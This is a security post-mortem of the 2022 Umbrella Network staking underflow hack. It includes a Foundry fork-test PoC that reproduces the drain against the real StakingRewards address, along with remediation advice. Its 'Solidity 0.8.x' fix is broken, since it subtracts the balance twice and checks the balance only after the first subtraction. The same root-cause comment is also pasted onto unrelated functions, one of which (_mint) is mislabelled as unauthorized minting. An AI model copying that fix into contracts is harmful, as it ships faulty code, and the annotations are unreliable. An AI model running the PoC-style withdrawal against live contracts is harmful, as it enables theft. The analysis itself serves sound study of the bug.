# Umbrella Network — Staking Underflow Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-17 |
| **Protocol** | Umbrella Network (UMB Staking) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$700,000 (UniLP tokens) |
| **Attacker** | [0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0](https://etherscan.io/address/0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0) |
| **Attack Contract** | [0x89767960b76b009416bc7ff4a4b79051eed0a9ee](https://etherscan.io/address/0x89767960b76b009416bc7ff4a4b79051eed0a9ee) |
| **Vulnerable Contract** | StakingRewards [0xB3FB1D01B07A706736Ca175f827e4F56021b85dE](https://etherscan.io/address/0xB3FB1D01B07A706736Ca175f827e4F56021b85dE) |
| **Root Cause** | Missing underflow check in the `withdraw(amount)` function during `_balances[user] - amount` computation, allowing any address with zero staked balance to withdraw large amounts |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Umbrella_exp.sol) |

---
## 1. Vulnerability Overview

Umbrella Network's StakingRewards contract provided functionality for staking UniLP tokens in exchange for rewards. The `withdraw(uint256 amount)` function deducts `amount` from the user's staked balance, but this arithmetic operation lacked an underflow check.

Solidity versions prior to 0.8.x do not prevent integer overflow/underflow by default. As a result, when computing `_balances[user] = 0 - amount`, an underflow occurs and the balance wraps to a value near `type(uint256).max`. From this state, an attacker could drain the contract's entire LP holdings either through repeated `withdraw()` calls or a single call.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable StakingRewards.withdraw() (pseudocode)
// Solidity 0.7.x or version without SafeMath
contract StakingRewards {
    mapping(address => uint256) private _balances;
    IERC20 public stakingToken;

    function withdraw(uint256 amount) public {
        // ❌ No underflow check
        // _balances[msg.sender] = 0, amount = 8,792,873,290,680,252,648,282
        // 0 - 8,792...282 = type(uint256).max - 8,792...282 + 1 (underflow)
        _balances[msg.sender] = _balances[msg.sender] - amount;

        // Actual token transfer follows
        stakingToken.transfer(msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }
}

// ✅ Solidity 0.8.x and above (automatic underflow check)
contract StakingRewardsFixed {
    function withdraw(uint256 amount) public {
        // ✅ Outside unchecked blocks, Solidity 0.8+ reverts automatically
        _balances[msg.sender] -= amount; // auto-reverts on insufficient balance

        // Additional protection: explicit validation
        require(_balances[msg.sender] >= amount, "insufficient balance");
        _balances[msg.sender] -= amount;
        stakingToken.transfer(msg.sender, amount);
    }
}

// ✅ Correct pattern for Solidity 0.7.x (using SafeMath)
contract StakingRewardsSafe {
    using SafeMath for uint256;

    function withdraw(uint256 amount) public {
        // ✅ SafeMath.sub() reverts on underflow
        _balances[msg.sender] = _balances[msg.sender].sub(amount, "withdraw > balance");
        stakingToken.transfer(msg.sender, amount);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**StakingRewards.sol** — Entry point:
```solidity
// ❌ Root cause: missing underflow check in `withdraw(amount)` during `_balances[user] - amount` computation, allowing any address with zero staked balance to withdraw large amounts
    function withdraw(uint256 amount) override public {  // ❌ Vulnerability
        _withdraw(amount, msg.sender, msg.sender);
    }
```

**Address.sol** — Related contract:
```solidity
// ❌ Root cause: missing underflow check in `withdraw(amount)` during `_balances[user] - amount` computation, allowing any address with zero staked balance to withdraw large amounts
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

**ERC20.sol** — Related contract:
```solidity
// ❌ Root cause: missing underflow check in `withdraw(amount)` during `_balances[user] - amount` computation, allowing any address with zero staked balance to withdraw large amounts
    function _mint(address account, uint256 amount) internal virtual {  // ❌ Unauthorized minting
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x1751e3...)
    │
    ├─[1] No staked balance
    │       _balances[attacker] = 0
    │
    ├─[2] Calls StakingRewards.withdraw(8,792,873,290,680,252,648,282)
    │       ⚡ Underflow triggered:
    │       _balances[attacker] = 0 - 8,792,873,290,680,252,648,282
    │                           = type(uint256).max - 8,792...282 + 1
    │                           = enormous positive value
    │
    ├─[3] Contract transfers 8,792... UniLP to attacker
    │       (entire LP balance held by contract can be drained)
    │
    └─[4] Loss: ~$700,000 UniLP
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IStakingRewards {
    // ⚡ Vulnerable function: no balance underflow check
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ContractTest is Test {
    IStakingRewards stakingRewards =
        IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
    IERC20 UniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);
    address attacker = 0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_421_983);
    }

    function testExploit() public {
        emit log_named_uint(
            "[Before] Attacker staked balance",
            stakingRewards.balanceOf(attacker)
        );
        emit log_named_decimal_uint(
            "[Before] Contract UniLP",
            UniLP.balanceOf(address(stakingRewards)), 18
        );

        vm.startPrank(attacker);

        // ⚡ Attempts large withdrawal with zero staked balance
        // Solidity 0.7.x: 0 - 8,792...282 → underflow → value near type(uint256).max
        // Contract transfers `amount` UniLP to caller — exploit succeeds
        stakingRewards.withdraw(8_792_873_290_680_252_648_282);

        vm.stopPrank();

        emit log_named_decimal_uint(
            "[After] Attacker UniLP",
            UniLP.balanceOf(attacker), 18
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Integer Underflow |
| **CWE** | CWE-191: Integer Underflow |
| **OWASP DeFi** | Arithmetic error due to missing SafeMath |
| **Attack Vector** | withdraw(amount > balance) → underflow → inflated balance |
| **Preconditions** | Solidity 0.7.x + no SafeMath, no balance validation |
| **Impact** | Full drain of all staked assets held in the contract |

---
## 6. Remediation Recommendations

1. **Use Solidity 0.8.x**: Versions 0.8.0 and above provide built-in overflow/underflow protection by default.
2. **SafeMath library**: For versions 0.7.x and below, always use OpenZeppelin's SafeMath.
3. **Explicit balance validation**: Always add `require(_balances[msg.sender] >= amount, "insufficient balance")`.
4. **Checks-Effects-Interactions**: Deduct the balance before transferring tokens and verify the underflow does not occur.

---
## 7. Lessons Learned

- **Importance of compiler version**: Upgrading to Solidity 0.8.x is not merely a syntax change — it provides default protection against arithmetic overflow and underflow.
- **The role of SafeMath**: Omitting SafeMath in Solidity 0.7.x and below is extremely dangerous and is the direct cause of this vulnerability.
- **$700K loss**: A classic integer arithmetic error pattern arising in staking contracts.
- **Recurring pattern**: Integer underflow attacks have appeared repeatedly since the early days of DeFi, underscoring the importance of the most fundamental arithmetic validation.